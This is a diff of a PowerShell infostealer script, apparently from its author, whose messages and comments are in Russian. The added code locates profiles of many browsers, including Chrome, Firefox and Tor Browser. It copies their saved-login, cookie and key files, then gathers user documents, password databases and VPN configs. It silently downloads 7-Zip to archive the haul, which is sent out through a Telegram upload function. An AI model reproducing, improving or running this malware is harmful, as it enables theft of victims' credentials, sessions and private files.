@@ -61,33 +61,110 @@ function Send-TelegramFile {
     Invoke-WebRequest -Uri $Url -Method Post -Body $fullBody -Headers $Headers
 }
 
-function Create-SplitArchive {
-    param (
-        [string]$SourcePath,
-        [string]$OutputZip,
-        [int64]$MaxPartSize = $MaxPartSize
-    )
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $OutputZip, [System.IO.Compression.CompressionLevel]::Fastest, $false)
-    $size = (Get-Item $OutputZip).Length
-    if ($size -ge $MaxPartSize) {
-        $fs = [System.IO.File]::OpenRead($OutputZip)
-        $part = 1
-        $partFiles = @()
-        while ($fs.Position -lt $fs.Length) {
-            $partName = "$($OutputZip -replace '\\.zip$', '')_part$part.zip"
-            $bytesToRead = [Math]::Min($MaxPartSize, $fs.Length - $fs.Position)
-            $buffer = New-Object byte[] $bytesToRead
-            $fs.Read($buffer, 0, $bytesToRead) | Out-Null
-            [System.IO.File]::WriteAllBytes($partName, $buffer)
-            $partFiles += $partName
-            $part++
-        }
-        $fs.Close()
-        Remove-Item $OutputZip -Force
-        return $partFiles
+function Download-7Zip {
+    param([string]$DestPath)
+    $url7z = "https://www.7-zip.org/a/7zr.exe"
+    try {
+        Invoke-WebRequest -Uri $url7z -OutFile $DestPath -UseBasicParsing
+        return $true
+    } catch {
+        return $false
     }
-    return @($OutputZip)
+}
+
+function Create-7ZipArchive {
+    param(
+        [string]$SourcePath,
+        [string]$ArchivePath,
+        [string]$SevenZipExe
+    )
+    $cmd = "`"$SevenZipExe`" a -mx=1 -r `"$ArchivePath`" `"$SourcePath`\*"
+    Invoke-Expression $cmd
+    return @($ArchivePath)
+}
+function Find-AllBrowserProfiles {
+    $profiles = @{}
+    $basePaths = @("$env:LOCALAPPDATA", "$env:APPDATA")
+    $browserData = @{
+        'Google\Chrome'               = 'Chrome';
+        'Google\Chrome Beta'          = 'Chrome Beta';
+        'Chromium'                    = 'Chromium';
+        'Microsoft\Edge'              = 'Edge';
+        'BraveSoftware\Brave-Browser' = 'Brave';
+        'Yandex\YandexBrowser'        = 'Yandex';
+        'Vivaldi'                     = 'Vivaldi';
+        'Opera Software\Opera Stable' = 'Opera';
+        'Opera Software\Opera GX Stable' = 'Opera GX';
+        'Comet'                       = 'Comet';
+        'AtlasBrowser'                = 'Atlas';
+        'Orbitum'                     = 'Orbitum';
+        'Amigo'                       = 'Amigo';
+        'Torch'                       = 'Torch';
+        'SunBrowser'                  = 'SunBrowser';
+        'Thorium'                     = 'Thorium';
+        'UCBrowser'                   = 'UC Browser';
+        'Mozilla\Firefox'             = 'Firefox';
+        'Waterfox'                    = 'Waterfox';
+        'Tor Browser'                 = 'Tor Browser';
+    }
+    foreach ($base in $basePaths) {
+        foreach ($path in $browserData.Keys) {
+            $fullPath = Join-Path -Path $base -ChildPath $path
+            if (Test-Path $fullPath) {
+                if ($profiles.ContainsKey($browserData[$path])) {
+                    $profiles[$browserData[$path]] += $fullPath
+                } else {
+                    $profiles[$browserData[$path]] = @($fullPath)
+                }
+            }
+        }
+    }
+    $extraBrowsers = Get-ChildItem "$env:LOCALAPPDATA" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "browser|chrome|opera|edge|yandex|firefox|comet|atlas|tor|waterfox|uc|brave|vivaldi|orbitum|amigo|thorium|sun" }
+    foreach ($dir in $extraBrowsers) {
+        if (-not ($profiles.Values | % { $_ } | Where-Object { $_ -eq $dir.FullName })) {
+            $profiles[$dir.Name] = @($dir.FullName)
+        }
+    }
+    return $profiles
+}
+
+function Get-BrowserFiles {
+    param ($BrowserProfiles, $LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    $filesToGrab = @(
+        'Login Data','Cookies','Web Data','History','Local State',
+        'key4.db','key3.db','logins.json','cookies.sqlite','formhistory.sqlite','places.sqlite','favicons.sqlite',
+        'Sessions','Session Storage','Secure Preferences','Extension Cookies','Top Sites'
+    )
+    foreach ($browserName in $BrowserProfiles.Keys) {
+        $browserLogPath = Join-Path -Path $LogPath -ChildPath $browserName
+        New-Item -Path $browserLogPath -ItemType Directory -Force | Out-Null
+        foreach ($profilePath in $BrowserProfiles[$browserName]) {
+            Get-ChildItem -Path $profilePath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+                foreach($file in $filesToGrab) {
+                    if ($_.Name -eq $file) {
+                        $target = Join-Path $browserLogPath $_.Name
+                        Copy-Item -Path $_.FullName -Destination $target -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            }
+        }
+    }
+    "Files for offline decryption have been collected." | Out-File "$LogPath\readme.txt"
+}
+
+function Copy-UserFiles {
+    param($LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    $locations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
+    $extensions = @("*.doc*","*.xls*","*.txt","*.pdf","*.rtf","*.kdbx","*.db","*.ini","*.vpn","*.ovpn","*.ftp","*.conf")
+    foreach ($loc in $locations) {
+        Get-ChildItem -Path $loc -Include $extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+            $targetDir = Join-Path -Path $LogPath -ChildPath ($_.Directory.Name)
+            if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }
+            Copy-Item $_.FullName -Destination $targetDir -Force
+        }
+    }
 }
 
 function Get-MessengerData {
@@ -473,7 +550,7 @@ function Get-VpnFtpData {
 }
 
 function Start-Stealer {
-    $LogFolder = "$env:TEMP\\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
+    $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
     if (-not (Test-Path $LogFolder)) { New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null }
     Write-Host $OutputMessages.Start -ForegroundColor Yellow
 
@@ -481,15 +558,22 @@ function Start-Stealer {
         if ($StealSystemInfo)         { Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan; Get-SystemInformation -LogPath $LogFolder }
         if ($TakeScreenshot)          { Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan; Get-Screenshot -LogPath $LogFolder }
         if ($GrabClipboard)           { Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan; Get-ClipboardData -LogPath $LogFolder }
-        if ($StealBrowserData)        { Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan; $BrowserProfiles = Find-AllBrowserProfiles; if ($null -ne $BrowserProfiles) { Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan; Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\\BrowserData" } }
-        if ($StealFiles)              { Write-Host $OutputMessages.Files -ForegroundColor Cyan; Copy-UserFiles -LogPath "$LogFolder\\Files" }
-        if ($StealGamingSessions)     { Write-Host $OutputMessages.Gaming -ForegroundColor Cyan; Get-GamingData -LogPath "$LogFolder\\Gaming" }
-        if ($StealMessengerLogs)      { Write-Host $OutputMessages.Messengers -ForegroundColor Cyan; Get-MessengerData -LogPath "$LogFolder\\Messengers" }
-        if ($StealSessionsAndTokens)  { Write-Host $OutputMessages.Tokens -ForegroundColor Cyan; Get-Tokens -LogPath "$LogFolder\\Tokens" -BrowserProfiles $BrowserProfiles }
-        if ($StealVpnFtp)             { Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan; Get-VpnFtpData -LogPath "$LogFolder\\VpnFtp" }
-        $ZipPath = "$env:TEMP\\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
+        if ($StealBrowserData)        { Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan; $BrowserProfiles = Find-AllBrowserProfiles; if ($null -ne $BrowserProfiles) { Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan; Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData" } }
+        if ($StealFiles)              { Write-Host $OutputMessages.Files -ForegroundColor Cyan; Copy-UserFiles -LogPath "$LogFolder\Files" }
+        if ($StealGamingSessions)     { Write-Host $OutputMessages.Gaming -ForegroundColor Cyan; Get-GamingData -LogPath "$LogFolder\Gaming" }
+        if ($StealMessengerLogs)      { Write-Host $OutputMessages.Messengers -ForegroundColor Cyan; Get-MessengerData -LogPath "$LogFolder\Messengers" }
+        if ($StealSessionsAndTokens)  { Write-Host $OutputMessages.Tokens -ForegroundColor Cyan; Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles }
+        if ($StealVpnFtp)             { Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan; Get-VpnFtpData -LogPath "$LogFolder\VpnFtp" }
+        
+        # --- Скрытая установка и удаление 7-Zip Portable ---
+        $SevenZipPath = "$env:TEMP\7zr.exe"
+        Write-Host "Загрузка 7-Zip..." -ForegroundColor Cyan
+        if (-not (Download-7Zip -DestPath $SevenZipPath)) {
+            throw "Не удалось скачать 7-Zip!"
+        }
+        $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
-        $archiveFiles = Create-SplitArchive -SourcePath $LogFolder -OutputZip $ZipPath -MaxPartSize $MaxPartSize
+        $archiveFiles = Create-7ZipArchive -SourcePath $LogFolder -ArchivePath $ZipPath -SevenZipExe $SevenZipPath
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
         $i = 1
         foreach ($archiveFile in $archiveFiles) {
@@ -497,6 +581,7 @@ function Start-Stealer {
             Remove-Item $archiveFile -Force -ErrorAction SilentlyContinue
             $i++
         }
+        Remove-Item $SevenZipPath -Force -ErrorAction SilentlyContinue
     }
     catch {
         Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
@@ -512,5 +597,6 @@ function Start-Stealer {
         Write-Host $OutputMessages.Complete -ForegroundColor Green
     }
 }
+
 
 Start-Stealer
